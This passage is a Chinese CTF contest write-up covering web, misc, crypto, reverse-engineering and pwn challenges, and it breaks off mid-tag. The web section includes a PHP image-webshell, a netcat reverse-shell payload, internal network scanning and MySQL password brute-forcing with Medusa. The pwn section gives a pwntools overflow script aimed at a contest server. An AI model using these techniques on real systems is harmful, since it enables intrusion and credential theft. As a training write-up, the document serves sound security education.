IMAGETYPE_GIF:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">"gif"</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> IMAGETYPE_JPEG:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">"jpg"</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> IMAGETYPE_PNG:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">"png"</span>;</span><br><span class="line">                <span class="keyword">break</span>;    </span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">        $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">        <span class="keyword">if</span> (isImage($temp_file)) &#123;</span><br><span class="line">            $name = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>];</span><br><span class="line">            $ext = substr(strrchr($name, <span class="string">'.'</span>), <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">if</span> (preg_match(<span class="string">"/ph|htaccess/i"</span>, $ext)) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"illegal suffix!"</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $ip = $_SERVER[<span class="string">'REMOTE_ADDR'</span>];</span><br><span class="line">                $fn = md5(time());</span><br><span class="line">                $dir = <span class="string">'uploads/'</span>.md5($ip);</span><br><span class="line">                <span class="keyword">if</span>(!is_dir($dir))&#123;</span><br><span class="line">                    mkdir($dir, <span class="number">0777</span>, <span class="keyword">true</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                $img_path = $dir.<span class="string">'/'</span>.$fn.<span class="string">'.'</span>.$ext;</span><br><span class="line">                <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                    $is_upload = <span class="keyword">true</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">'上传出错！'</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> ($is_upload) &#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">'&lt;img src="'</span>.$img_path.<span class="string">'" alt="Image"/&gt;'</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'not image!'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;a href=<span class="string">"/view.php?article=wind.php"</span>&gt;夏天的风&lt;/a&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;a href=<span class="string">"/view.php?article=song.php"</span>&gt;歌·颂&lt;/a&gt;</span><br></pre></td></tr></table></figure><p>ban 了 <code>htaccess</code> 和 <code>ph</code> 后缀的所有文件，并且用 <code>exif_imagetype</code> 检测是否是图片，看样子只能上传图片。写入 <code>phpinfo()</code> 利用文件包含发现可以执行</p><p><code>http://47.110.130.169:10001/view.php?article=图片路径</code></p><p>可以直接在图片末尾写个马，也可以利用命令制作图片马：<code>copy shell.jpg /b + shell.php /a realshell.jpg</code></p><p>这些在之前的直播培训中都有说到，接下来使用蚁剑连接或者反弹shell都可以</p><p>蚁剑方法：</p><p><img src="https://gitee.com/ivenwings/md_img/raw/master/img/20200601011824.png" alt="image-20200601011824402"></p><p>在根目录找不到 <code>flag</code>，但是发现有一个 <code>hint.txt</code></p><p><img src="https://gitee.com/ivenwings/md_img/raw/master/img/20200601004446.png" alt="image-20200601004446767"></p><p>预期解是反弹shell，监听 <code>nc -lvp port</code>，写入马 <code>&lt;?php exec(&quot;nc ip port -e /bin/bash&quot;); ?&gt;</code> ，包含了之后可以发现弹到了shell。</p><p><img src="https://gitee.com/ivenwings/md_img/raw/master/img/20200526153521.png" alt="image-20200526153521836"></p><p>ls 一下可以看到当前的目录，我们去找一下 <code>/flag</code>，当然找不到，因为不在这个服务器上，但是可以找到一个 <code>hint.txt</code> </p><p><img src="https://gitee.com/ivenwings/md_img/raw/master/img/20200601004417.png" alt="image-20200601004417726"></p><p>flag 不在这台服务器，看样子接下来就是内网探测了，我们 <code>route -n</code> 可以看一下目前的网关。</p><p><img src="https://gitee.com/ivenwings/md_img/raw/master/img/20200526153541.png" alt="image-20200526153541496"></p><p>用 <code>ifconfig</code> 可以看到当前主机的网络</p><p><img src="https://gitee.com/ivenwings/md_img/raw/master/img/20200526153553.png" alt="image-20200526153553563"></p><p><code>hint.txt</code> 已经说了善用工具，且题目非常贴心地安装了 <code>nmap</code>，于是 <code>nmap -sP 192.168.1.0/24</code> 扫描内网存活主机，发现 ip 为 <code>192.168.1.123</code> 的存活主机，因此那就是下一步需要的搞的机。</p><p><img src="https://gitee.com/ivenwings/md_img/raw/master/img/20200526153648.png" alt="image-20200526153648330"></p><p><code>curl 192.168.1.123</code> 和 <code>curl 192.168.1.110</code> 发现没有回显，当然因为没有开 http 服务，我们先扫描一下看看开放了什么端口，用 <code>nmap -p 1-65535 192.168.1.123</code>  <code>nmap -p 1-65535 192.168.1.110</code>来扫描全部端口，发现很贴心地只开了一个 <code>9997</code> 端口，那只有是它了。</p><p><img src="https://gitee.com/ivenwings/md_img/raw/master/img/20200526153827.png" alt="image-20200526153827321"></p><p><img src="https://gitee.com/ivenwings/md_img/raw/master/img/20200526153806.png" alt="image-20200526153805961"></p><p>直接 <code>nc 192.168.1.123 9997</code>  连上去，发现贴心地提醒了要以 admin 登陆，我们没有密码，另一个服务器贴心地刚好开了 mysql，那不难想到用户名密码在数据库里面，因此我们尝试爆破一下<code>mysql</code> 密码，这里没有提供字典，因此需要自己想办法把字典搞进去，可以将字典放在自己服务器，然后用 <code>wget</code> 或者 <code>curl</code>把字典带进去，当然蚁剑等工具也是可以的。这里又贴心地装了 <code>Medusa</code>，爆破 mysql 的软件常用是 <code>hydra</code> 和 <code>medusa</code> ，百度一下就知道了，没有装<code>hydra</code>，那用 <code>medusa</code>：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">medusa -h 192.168.1.110 -u wust -P wordlists.txt -M mysql</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/ivenwings/md_img/raw/master/img/20200526154141.png" alt="image-20200526154141877"></p><p>爆出了密码 <code>iloveyou</code>，这里也安装好了 <code>mysql-client</code>，命令远程登陆：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql -uwust -p -h 192.168.1.110</span><br><span class="line">mysql -uwust -piloveyou -h 192.168.1.110</span><br></pre></td></tr></table></figure><p>我在测试的时候出现反弹 shell 的时候进行 mysql 交互是没有回显，其实这个点有点意外，一开始 debug 了好久，差点要改题目了，但是后来发现还是可以做的，可以用 <code>mysql -uwust -piloveyou -h 192.168.1.110</code> 连上去后，直接开始执行查询语句，然后输入一个错误的语句，报错后就会输出原本的信息了，原因应该是回显到缓冲区了，报错断开会话后就会显示信息.</p><p><img src="https://gitee.com/ivenwings/md_img/raw/master/img/20200531133324.png" alt="image-20200531133317526"></p><p><img src="https://gitee.com/ivenwings/md_img/raw/master/img/20200531133343.png" alt="image-20200531133343348"></p><p>当然如果你选择用工具连上去，蚁剑<strong>终端</strong>是不能创建 mysql，ssh 等交互式会话的，用数据库的模块：</p><p><img src="https://gitee.com/ivenwings/md_img/raw/master/img/20200531133952.png" alt="image-20200531133952593"></p><p>也可以尝试冰蝎，一套操作都写好了。</p><p><img src="https://gitee.com/ivenwings/md_img/raw/master/img/20200529234531.png" alt="image-20200529234530994"></p><p>也可以用数据库管理工具挂个代理就连上去，<code>navicat</code> 或者 <code>sqllog</code> 都可以直接查库。</p><p>查数据库：</p><p><img src="https://gitee.com/ivenwings/md_img/raw/master/img/20200526154351.png" alt="image-20200526154351359"></p><p>查表：</p><p><img src="https://gitee.com/ivenwings/md_img/raw/master/img/20200526154417.png" alt="image-20200526154417752"></p><p>然后直接查用户就可以了</p><p><img src="https://gitee.com/ivenwings/md_img/raw/master/img/20200529235205.png" alt="image-20200529235205910"></p><p>就三个，找到对的一个回去登陆后发现有一行字：</p><p><code>You take my shell, but my port is closed, my network is closed, everything is closed.</code></p><p>提示了 <code>closed</code>，无论怎么输入都没有回显，也就关闭了标准输出，所以需要资源重定向。</p><p>提示也给出了源码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">close</span>(<span class="number">1</span>); </span><br><span class="line"><span class="built_in">close</span>(<span class="number">2</span>); </span><br><span class="line"><span class="keyword">return</span> shell(); </span><br><span class="line"><span class="comment">//输出重定向</span></span><br></pre></td></tr></table></figure><p>老套路，百度就有，理解一下就可以做了，也可以参考校赛 <code>pwn 题 closed</code> 的 <code>payload</code>， 一打就行</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sh 1&gt;&amp;0</span><br><span class="line"><span class="comment">#这个点不算pwn的知识，是操作系统基本知识，原理还是得了解一下</span></span><br></pre></td></tr></table></figure><p>根据说明 <code>flag</code> 在 <code>/flag</code>，直接读取即可：</p><p><img src="https://gitee.com/ivenwings/md_img/raw/master/img/20200526154632.png" alt="image-20200526154632416"></p><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="还是写题爽"><a href="#还是写题爽" class="headerlink" title="还是写题爽"></a>还是写题爽</h3><p>出题人: 0bs3rver</p><p>其实出题想法是出题目好麻烦啊～</p><p>写写题，写不出来就去看WP，嫖一波知识，多爽啊，哎</p><p>拿到一个压缩包，打开是一个带密码的flag.7z和password文档，根据题目描述WTF想到Brainfuck密码（一点点脑洞），拿到这里解开<a href="https://www.splitbrain.org/services/ook" target="_blank" rel="noopener">https://www.splitbrain.org/services/ook</a></p><p>得到密码，解开可得一个二维码，但是定位块被我扣掉了，补上去一扫即可get flag。</p><p>flag{chu_ti_hao_ma_fan}</p><h3 id="Cry"><a href="#Cry" class="headerlink" title="Cry"></a>Cry</h3><p>​        是一个杰瑞笑哭的表情包。。。</p><p>​        查看属性，没啥发现。</p><p>​        丢进Winhex或者ida进行二进制分析。</p><p><img src="https://s1.ax1x.com/2020/06/01/t8saZV.png" alt="t8saZV.png"></p><p>​        拉到最后发现flag：</p><p><img src="https://s1.ax1x.com/2020/06/01/t8sdaT.png" alt="t8sdaT.png"></p><h2 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h2><h3 id="Are-u-ok？"><a href="#Are-u-ok？" class="headerlink" title="Are u ok？"></a>Are u ok？</h3><p>出题人: 0bs3rver</p><p>同拿到压缩包，打开是password文档和带密码压缩包，打开文档一看带=号，但其实并不是base64，考虑到是密码学分类，可能是一些乱七八糟的加密</p><p>需要尝试一波，使用的是AES，密钥是题目描述：nobody is ok.</p><p>即可得到密码，打开一看，又是乱七八糟的玩意，一大堆Ook，很明显就是这个加密，同样的在线网站解开，<a href="https://www.splitbrain.org/services/ook，即可get" target="_blank" rel="noopener">https://www.splitbrain.org/services/ook，即可get</a> flag。</p><p>flag{I’m not ok, ok?}</p><h3 id="be-r"><a href="#be-r" class="headerlink" title="be@r"></a>be@r</h3><p>​        由熊大曰可以可以看出来是与熊论道编码，通过<a href="http://hi.pcmoe.net/index.html" target="_blank" rel="noopener">在线解码</a></p><p>​        将熊大曰改为熊曰，解码得到flag</p><p><img src="https://s1.ax1x.com/2020/06/01/t8sDG4.png" alt="t8sDG4.png"></p><h2 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h2><h3 id="maze"><a href="#maze" class="headerlink" title="maze"></a>maze</h3><p>根据题目名和题目描述可以猜到是迷宫类逆向</p><p>比较困难的地方可能是c++，这玩意ida打开挺难看的</p><p>程序逻辑是根据输入在8*8的方块内进行移动，一旦移动到 ‘Z’ 位置就错了，而且最后需要移动到 ‘W’ 位置，一共能移动十五次，只有一条道路可以进行选择，WSAD分别控制上下左右，输入就是flag</p><p>附个源码</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> a[<span class="number">64</span>] = &#123;</span><br><span class="line">  <span class="string">'P'</span>, <span class="string">'P'</span>, <span class="string">'Z'</span>, <span class="string">'Z'</span>, <span class="string">'P'</span>, <span class="string">'Z'</span>, <span class="string">'Z'</span>, <span class="string">'Z'</span>,</span><br><span class="line">  <span class="string">'Z'</span>, <span class="string">'P'</span>, <span class="string">'Z'</span>, <span class="string">'Z'</span>, <span class="string">'P'</span>, <span class="string">'P'</span>, <span class="string">'P'</span>, <span class="string">'Z'</span>,</span><br><span class="line">  <span class="string">'Z'</span>, <span class="string">'P'</span>, <span class="string">'P'</span>, <span class="string">'Z'</span>, <span class="string">'Z'</span>, <span class="string">'Z'</span>, <span class="string">'P'</span>, <span class="string">'Z'</span>,</span><br><span class="line">  <span class="string">'Z'</span>, <span class="string">'Z'</span>, <span class="string">'P'</span>, <span class="string">'Z'</span>, <span class="string">'P'</span>, <span class="string">'P'</span>, <span class="string">'P'</span>, <span class="string">'P'</span>,</span><br><span class="line">  <span class="string">'Z'</span>, <span class="string">'Z'</span>, <span class="string">'P'</span>, <span class="string">'Z'</span>, <span class="string">'P'</span>, <span class="string">'Z'</span>, <span class="string">'Z'</span>, <span class="string">'W'</span>,</span><br><span class="line">  <span class="string">'Z'</span>, <span class="string">'Z'</span>, <span class="string">'P'</span>, <span class="string">'P'</span>, <span class="string">'P'</span>, <span class="string">'Z'</span>, <span class="string">'Z'</span>, <span class="string">'Z'</span>,</span><br><span class="line">  <span class="string">'Z'</span>, <span class="string">'P'</span>, <span class="string">'Z'</span>, <span class="string">'Z'</span>, <span class="string">'Z'</span>, <span class="string">'P'</span>, <span class="string">'P'</span>, <span class="string">'P'</span>,</span><br><span class="line">  <span class="string">'Z'</span>, <span class="string">'P'</span>, <span class="string">'Z'</span>, <span class="string">'Z'</span>, <span class="string">'Z'</span>, <span class="string">'Z'</span>, <span class="string">'Z'</span>, <span class="string">'Z'</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">int</span> a1=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">move</span><span class="params">(<span class="keyword">char</span> m)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> c[<span class="number">20</span>];</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"Please input your flag:"</span>;</span><br><span class="line">    <span class="built_in">cin</span> &gt;&gt; c;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">14</span>; i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">move</span>(c[i]) == <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="built_in">cout</span> &lt;&lt; <span class="string">"Wrong flag!"</span> &lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">move</span>(c[<span class="number">14</span>]);</span><br><span class="line">    <span class="keyword">if</span>(a[a1] != <span class="string">'W'</span>)&#123;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">"Wrong flag!"</span> &lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"Wow, you get right flag!"</span> &lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">move</span><span class="params">(<span class="keyword">char</span> m)</span></span>&#123;</span><br><span class="line">    <span class="keyword">switch</span> (m) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">'W'</span>:</span><br><span class="line">            a1 -= <span class="number">8</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">'A'</span>:</span><br><span class="line">            a1--;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">'S'</span>:</span><br><span class="line">            a1 += <span class="number">8</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">'D'</span>:</span><br><span class="line">            a1++;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(a1&gt;<span class="number">0</span> &amp;&amp; a1&lt;<span class="number">63</span>)</span><br><span class="line">        <span class="keyword">if</span>(a[a1] == <span class="string">'P'</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>flag{DSSDSSSDDWWDDDS}</p><h3 id="ezbabyre"><a href="#ezbabyre" class="headerlink" title="ezbabyre"></a>ezbabyre</h3><p>拿到程序首先试着运行一波，会让你解三个数学 (?) 问题，但是解开并没有flag（笑</p><p>扔进ida也看不出来啥，考虑到逆向分类，大概率是加壳，最常见的就是upx壳，linux下使用upx工具解开即可得到程序</p><p>看起来很多，其实很容易就能找到关键函数（没办法，不到40kb不能upx加壳，只能静态编译了</p><p>但是根据main函数走了一遍，啥也没有，继续寻找可以发现还有一个有函数名的函数从来没有调用过，打开一看，是输入和判定，推测这就是flag验证函数。</p><p>程序逻辑是根据奇偶分别进行加密</p><p>逆向算法也很简单，解开即可get flag</p><p>这里也附一个源码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">check1</span><span class="params">(<span class="keyword">int</span> x)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">check2</span><span class="params">(<span class="keyword">int</span> x)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">check3</span><span class="params">(<span class="keyword">int</span> x)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">flag</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">There</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br><span class="line"><span class="keyword">char</span> Flag[] = <span class="string">"flag is not here"</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> x;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"I'll ask you some math questions, plz give me your answer.\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"660 * x + 795 == 742 mod 2009\n"</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;x);</span><br><span class="line">    <span class="keyword">if</span>(check1(x) == <span class="number">0</span>) <span class="keyword">return</span>  <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"What is the twenty-five prime number?\n"</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;x);</span><br><span class="line">    <span class="keyword">if</span>(check2(x) == <span class="number">0</span>) <span class="keyword">return</span>  <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Answer to the Ultimate Question of Life, the Universe, and Everything?\n"</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;x);</span><br><span class="line">    <span class="keyword">if</span>(check3(x) == <span class="number">0</span>) <span class="keyword">return</span>  <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    flag();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">check1</span><span class="params">(<span class="keyword">int</span> x)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>((<span class="number">660</span>*x+<span class="number">795</span>)%<span class="number">2009</span> != <span class="number">742</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Wrong answer!\n"</span>);</span><br><span class="line">        <span class="keyword">return</span>  <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">check2</span><span class="params">(<span class="keyword">int</span> x)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(x != <span class="number">97</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Wrong answer!\n"</span>);</span><br><span class="line">        <span class="keyword">return</span>  <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">check3</span><span class="params">(<span class="keyword">int</span> x)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(x != <span class="number">42</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Wrong answer!\n"</span>);</span><br><span class="line">        <span class="keyword">return</span>  <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">flag</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Wow, You solved all the problems!\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"But I have to say...\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%s :P\n"</span>, Flag);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> f[] = <span class="string">"egbbxr3r\\tLp\\b0o\\mf\\o,zZEgbb~"</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">There</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> b[<span class="number">30</span>];</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%s"</span>, b);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">29</span>; i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(i%<span class="number">2</span> == <span class="number">0</span>)</span><br><span class="line">            b[i] = b[i]^<span class="number">0x3</span>;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            b[i] = b[i] - <span class="number">5</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">29</span>; i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(f[i] != b[i])&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"Wrong!\n"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>flag{w0w_yOu_g3t_real1y_Flag}</p><h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="overflow-still"><a href="#overflow-still" class="headerlink" title="overflow_still"></a>overflow_still</h3><p>​        从题目可以看出来，这还是一个overflow的题目。</p><p>​        在Ubuntu终端执行命令来远程运行程序。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc 121.41.113.245 10001</span><br></pre></td></tr></table></figure><p>​        ELF文件丢入IDA分析，在左侧函数窗口可以找到两个主要函数：</p><p>​        main():<img src="https://s1.ax1x.com/2020/06/01/t8sHsI.png" alt="t8sHsI.png"></p><p>​        func():<img src="https://s1.ax1x.com/2020/06/01/t8sBiF.png" alt="t8sBiF.png"></p><p>​        程序的逻辑是，只要a1的值等于0xcafebabe就能拿到flag。但是程序正常流程中没有修改a1的地方。</p><p>​        不过找到了一个溢出点就是gets()。这个函数用起来虽然方便，但是并不对于输入长度进行检查，因此容易产生溢出，比较危险。</p><p>​        在s变量声明代码旁边的注释可以找到[ebp-28h]，说明s距离栈底0x28字节，再将光标放在a1上:</p><p><img src="https://s1.ax1x.com/2020/06/01/t8swIU.png" alt="t8swIU.png"></p><p>​        所以思路就是：对s变量进行溢出，覆盖掉a1，让它等于0xcafebabe。而溢出的量通过计算得：-0x28-0x8=0x30</p><p>​        脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">"121.41.113.245"</span>,<span class="number">10001</span>)</span><br><span class="line">p.send(<span class="string">'a'</span>*<span class="number">0x30</span>+p32(<span class="number">0xcafebabe</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="rop-still"><a href="#rop-still" class="headerlink" title="rop_still"></a>rop_still</h3><p>​        又一个rop，绝对的基础知识😂。</p><p>​        在Ubuntu终端执行命令来远程运行程序。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span 